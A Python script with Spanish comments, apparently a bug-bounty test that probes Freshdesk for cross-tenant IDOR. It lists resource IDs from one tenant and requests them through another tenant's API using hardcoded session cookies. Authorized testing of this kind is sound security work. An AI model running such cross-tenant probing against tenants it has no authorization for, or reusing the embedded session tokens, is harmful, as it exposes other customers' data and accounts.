#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
idor_cross_tenant.py — Test DEFINITIVO de IDOR Cross-Tenant en Freshdesk
=========================================================================
Metodología correcta:
  1. Tenant B (víctima): mapear sus IDs reales (contactos, agentes, grupos, etc.)
  2. Tenant A (atacante): intentar acceder a esos IDs específicos del Tenant B
  3. Si Tenant A obtiene datos de Tenant B → IDOR confirmado → Reporte a HackerOne

Uso: python3 idor_cross_tenant.py
"""

import requests
import json
import sys
import time

# ─────────────────────────────────────────────────────────────────────────────
# TENANT A — ATACANTE (nuestra cuenta principal)
# ─────────────────────────────────────────────────────────────────────────────
TENANT_A_URL = "https://wearehackerone5431.freshdesk.com"
TENANT_A_HELPKIT = "cFJkQUpsVFZITHA3Y3VkTXl4TzdoZWo5WWphV2MreDQ2NEZFa2ZYd1A1eHFJUnhHR1JwV2o2eUgxZkRLVVZ4dGhuOEptU3FSdFMvWjFHMENhalpnNldCS1RyTkI5VEVNckNMVHJGbnRaZkxpcGhVUFh4bTMyQmdBZkRuQTN1Yy9XR0VZSlFPVTIyMWQ5TTE1aXVGNEhRQ1FXSFR4UTdFU3ZKS0FGcm83UmR2cFF5aWM2SjdTUHlURG9peDZoR3NMbmlSUCsyWG1IQkJtcHlYTWRCTlphdVBVeUllYWMvRUMxcWxEQW0vZjJpRmRuUjZ4UTVPMVg4Z24yNW10ZDQvUTltVmNvQXV6VXF4bFpESDl1UG0yanhGdXgyNEVCU0p5N1VhcDJJWnB1Q2w0SVg0dUZ4TTBYL3JaNWdtYjU5TlJtT2Jtc2Q1Z3NweGsxbUJweUpjWnN6UjZuUGE0cEtkdHA3Nmk0V051ekFTUDNDV2FMWGQzbGp2VUFScWJHL0QzMEFwVXdEWGtFVFVvWmVKZVJrN3EySW9sSnIzeUlIM3I3ZEFwaCt5MTJLWEhIUEdSZzY4UWIrcDF2NWFPWUJXZGJSR1BpVEc2T2lSQ21yb3hOTjRWdHEyR1Z5azZ6WnJQNkRjMkdLODQwem16eVEwUHJySmxDSC9abDl5WktUeFhvM0Y1aHdXMjhVTEVHVm5DbWxqY1pCcFlmZ01zNU9PdWU2OW1DNE43ZDU3THM4OVNpQ3hmZ3F3RjRCTWRDRUlza0o5eEJ6Nzk1SlhSa2dkdU5YMHVYOXhPaG1tT21USzRzbFFSbHlRbHQ0b0xuM3lUZ2FXQUlVeXpoeHNLbWRxVGlWRk9hNEdIMjl2OCtpZHJ1S1VtR2xuWWUzQ2ZNR0xMTWtacWFkek1KbXM9LS16UmQ0Y3dBcWlLTlFidmhXK1RzRHV3PT0%3D--62967d2d60b9113b62cf51c3388351dadf982a9e"
TENANT_A_USERCREDS = "BAhJIgGOZTE4YjYzZjIzMWI0YzBjNzU0ZDk3YWFkMTFlNTUyNjM0YWM0NDljNjVlMWYxNWYxMjYwNTljYzU4YWZiYmE3ZGVmNDYyYzMwMjU2ZGI5OGNlNDhkNzZlOGM4NmVhMGIxMTA1MGZhNDA3OGY0NTc5MDU2MDE0NGZjMzJhNjMwYmI6OjE1ODAxNDk4ODQwMgY6BkVU--4dcdc63ebb176b9449284a9d4dbfbaa8d7e1db1a"

# ─────────────────────────────────────────────────────────────────────────────
# TENANT B — VÍCTIMA (segunda cuenta — completar después de crearla)
# ─────────────────────────────────────────────────────────────────────────────
TENANT_B_URL = "https://wearehackerone4764.freshdesk.com"
TENANT_B_HELPKIT = "bXRLclpoQTI3S1F5M2cvdUJwLzlqNW1Za050Z3BsaFJvbHNMSzZOdzBoN1cxbTVWYVo0NnhoK3Jyd0hyQ0crT3NkUmhyRnZyWGM3VGlNZ01yZUVkazBSMkcvQzBiREpCbGo0Q1QrL0ErK282UnlXYVdwSytNUmFyZXZNOHdXQXMzOVJMcWh3cHZXMTNsWkM2dGxSbDIybjgwNzJHWHZGTUZuSVR5Zk1lZjM1UnFsWDdyMVBBaU93dkFXN2d5MmhkaDltN2w0ejV6S0k3NkVLN2gxbEZHUG9VYzdjaGZWeWJubDhVdXN5V05MRVREOXh6K1J6eSt0c1pJRHpWVmxZcXM0ckQ0Wmc2ZVcrZllKQTQzTTgwSjVDKzlheU1CY3pZMUFHL3Y3ekJMRFYvL09Tczk3YjJieWlDOFBHaUJ6Y2NpS1QwclB5RHFLcUVybDJMT0RmYVA5bkZ4RWtMZ2x6SW9RK2MwY3gySDRVT1F2aEZ2ZXdjN0VWcHh0NmJ5NXdJM1MzTzMybFhaN0J5VUpaZU11TFduK0RZRktzQ2tUeGtkbTJaMWltcG0wZ3kwSkNNTzlOa1BJcXY0VzhQbGVKNE5kQVk5aG43QjhubjlmbmpISHU3dUJmcmY4QjVhZUh6SHcwUFY3cjBCZ0Eyajg0eitYU1VIb1RUMmt3d2ptb1J6a0hSZEhXMGVLUzgyOUVXejNXZWo5MXJkT3EwUitTU2czaTZQMHpFbmlOZjBZak1BdkIrWmpaOEFuRFBTNTRLY0FvbmcxV0RYazFsdHNrMmNtWUJIR3ZBME1mZEp3SjJzbWl4TFdyUnZqMEgxRTArZW1sRzYvVWdEbFQwbkdtdEdMT3dCQ2JnYVhzaTNpSkJHanFOVER3RVlZM1h5bWNDZ3hRTWc1V1dGZnk1WENqN0ZHb1BPeXJkdjRZc0pjbUR2L0dIWlpVSXk0bWptL2s0ZHRWRU13PT0tLVpIeHBuZUY0UmdSb1hWdEhETStLYVE9PQ%3D%3D--a8dfcd3079e50b933df72b844527703eb61d9ad9"
TENANT_B_USERCREDS = "BAhJIgGNNTAxYmZlYjg5MGM5ZjU4YWNiOTRlMTRlMmViZmY3ZGNlYTE1OTljYzA0Mzg1MWIyYThhZTVlNjAzMDc4YzNiZTI3YTdhMjY2OThjY2Q1OTc4ODgzNDU1MDY1YzU0MzdiNzZjMTNiY2JhN2EyN2U5M2Q2OWY4YTZjOGNkODQ3OGI6OjY4MDA2NjA3NzEwBjoGRVQ%3D--a67c907e37e68496afb18b835dda02999eaec8ef"

# ─────────────────────────────────────────────────────────────────────────────
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "X-Bug-Bounty": "HackerOne-tomas244",
    "Accept": "application/json, text/plain, */*",
}


def make_session(helpkit, usercreds, base_url):
    s = requests.Session()
    s.headers.update({**HEADERS, "Referer": base_url})
    s.cookies.update({
        "_helpkit_session": helpkit,
        "user_credentials": usercreds,
    })
    return s


def sep(titulo=""):
    print(f"\n{'─'*60}")
    if titulo:
        print(f"  {titulo}")
        print(f"{'─'*60}")


def verificar_sesion(sess, tenant_url, nombre):
    r = sess.get(f"{tenant_url}/a/tickets", allow_redirects=False)
    ok = r.status_code in [200, 302]
    print(f"  {nombre}: GET /a/tickets → {r.status_code} {'✅' if ok else '❌ SESIÓN INVÁLIDA'}")
    return ok


def mapear_ids_tenant(sess, tenant_url, nombre):
    """Extrae todos los IDs de recursos del tenant para usarlos en el test."""
    sep(f"MAPEANDO IDs DE {nombre} ({tenant_url})")
    recursos = {}
    endpoints = {
        "contacts": "/api/v2/contacts",
        "agents": "/api/v2/agents",
        "groups": "/api/v2/groups",
        "products": "/api/v2/products",
        "tickets": "/api/v2/tickets",
        "roles": "/api/v2/roles",
    }
    for nombre_rec, ep in endpoints.items():
        try:
            r = sess.get(f"{tenant_url}{ep}")
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    ids = [item.get("id") for item in data if item.get("id")]
                    recursos[nombre_rec] = ids
                    print(f"  {nombre_rec:12s}: {len(ids)} items → IDs: {ids[:5]}")
                elif isinstance(data, dict):
                    recursos[nombre_rec] = []
                    print(f"  {nombre_rec:12s}: dict (sin IDs directos)")
            else:
                print(f"  {nombre_rec:12s}: HTTP {r.status_code}")
                recursos[nombre_rec] = []
        except Exception as e:
            print(f"  {nombre_rec:12s}: ERROR {e}")
            recursos[nombre_rec] = []
    return recursos


def test_cross_tenant_idor(sess_atacante, tenant_a_url, ids_victima, tenant_b_url):
    """
    TEST DEFINITIVO: Desde Tenant A, intentar acceder a los IDs del Tenant B.
    Si cualquier request devuelve 200 con datos → IDOR REAL CONFIRMADO.
    """
    sep("TEST CROSS-TENANT IDOR (ATACANTE → VÍCTIMA)")
    print(f"  Atacante: {tenant_a_url}")
    print(f"  Víctima:  {tenant_b_url}")
    print()

    # Endpoints a testear (usando el dominio del ATACANTE pero IDs del VÍCTIMA)
    endpoints_map = {
        "contacts":  "/api/v2/contacts/{}",
        "agents":    "/api/v2/agents/{}",
        "groups":    "/api/v2/groups/{}",
        "products":  "/api/v2/products/{}",
    }

    hallazgos = []
    total_tests = 0

    for tipo, endpoint_template in endpoints_map.items():
        ids = ids_victima.get(tipo, [])
        if not ids:
            print(f"  {tipo:12s}: sin IDs del Tenant B — saltando")
            continue

        print(f"\n  --- Testeando {tipo.upper()} del Tenant B desde Tenant A ---")
        for rid in ids:
            time.sleep(0.5)  # Pausar entre requests
            total_tests += 1
            try:
                url = f"{tenant_a_url}{endpoint_template.format(rid)}"
                r = sess_atacante.get(url)

                if r.status_code == 200:
                    data = r.json()
                    nombre_campo = data.get("name", data.get("first_name", "?"))
                    email_campo = data.get("email", "—")
                    print(f"  🚨🚨 IDOR CONFIRMADO [{tipo}][{rid}]: {nombre_campo} / {email_campo}")
                    hallazgos.append({
                        "tipo": tipo,
                        "id": rid,
                        "data": data,
                        "url": url,
                    })
                elif r.status_code == 403:
                    print(f"  ⚠️  [{tipo}][{rid}]: 403 Forbidden — recurso existe, acceso bloqueado")
                elif r.status_code == 404:
                    print(f"  ✅ [{tipo}][{rid}]: 404 — correctamente aislado por tenant")
                elif r.status_code == 429:
                    print(f"  ⏳ [{tipo}][{rid}]: Rate limited — pausando 10s...")
                    time.sleep(10)
                else:
                    print(f"  ❓ [{tipo}][{rid}]: HTTP {r.status_code}")
            except Exception as e:
                print(f"  [{tipo}][{rid}]: ERROR {e}")

    print(f"\n  Total tests realizados: {total_tests}")

    if hallazgos:
        print(f"\n  🚨🚨🚨 IDOR CROSS-TENANT CONFIRMADO — {len(hallazgos)} recursos ajenos accesibles!")
        print("\n  DATOS PARA EL REPORTE H1:")
        for h in hallazgos:
            print(f"    → URL: {h['url']}")
            print(f"      Datos: {json.dumps(h['data'], indent=6)[:200]}")
    else:
        print("\n  ✅ No se pudo acceder a recursos del Tenant B desde el Tenant A.")
        print("  Freshdesk parece correctamente aislado en este vector.")

    return hallazgos


def main():
    print("=" * 60)
    print("  TEST IDOR CROSS-TENANT — Freshdesk")
    print(f"  Atacante: {TENANT_A_URL}")
    print(f"  Víctima:  {TENANT_B_URL}")
    print("=" * 60)

    # Verificar si Tenant B tiene cookies configuradas
    if "PEGAR_AQUI" in TENANT_B_HELPKIT:
        print("\n❌ CONFIGURAR PRIMERO: pegar las cookies del Tenant B en este script.")
        print("   TENANT_B_HELPKIT y TENANT_B_USERCREDS deben tener valores reales.")
        sys.exit(1)

    # Crear sesiones
    sess_a = make_session(TENANT_A_HELPKIT, TENANT_A_USERCREDS, TENANT_A_URL)
    sess_b = make_session(TENANT_B_HELPKIT, TENANT_B_USERCREDS, TENANT_B_URL)

    # Verificar autenticación en ambos tenants
    sep("VERIFICANDO SESIONES")
    ok_a = verificar_sesion(sess_a, TENANT_A_URL, "Tenant A (atacante)")
    ok_b = verificar_sesion(sess_b, TENANT_B_URL, "Tenant B (víctima) ")

    if not ok_a:
        print("\n❌ Sesión del Tenant A inválida. Renovar TENANT_A_HELPKIT.")
        sys.exit(1)
    if not ok_b:
        print("\n❌ Sesión del Tenant B inválida. Renovar TENANT_B_HELPKIT.")
        sys.exit(1)

    print("\n  ✅ Ambas sesiones válidas — iniciando test...")

    # Mapear IDs del Tenant B (víctima)
    ids_victima = mapear_ids_tenant(sess_b, TENANT_B_URL, "TENANT B (VÍCTIMA)")

    # TEST PRINCIPAL: Atacante intenta acceder a IDs de la víctima
    hallazgos = test_cross_tenant_idor(sess_a, TENANT_A_URL, ids_victima, TENANT_B_URL)

    sep("CONCLUSIÓN")
    if hallazgos:
        print("  🎯 IDOR CONFIRMADO — Preparar reporte para HackerOne")
        print("  Los datos de arriba son la evidencia del bug.")
    else:
        print("  ✅ Sin IDOR detectado en este vector.")
        print("  Próximo paso: probar otros endpoints o productos Freshworks.")
    print("=" * 60)


if __name__ == "__main__":
    main()
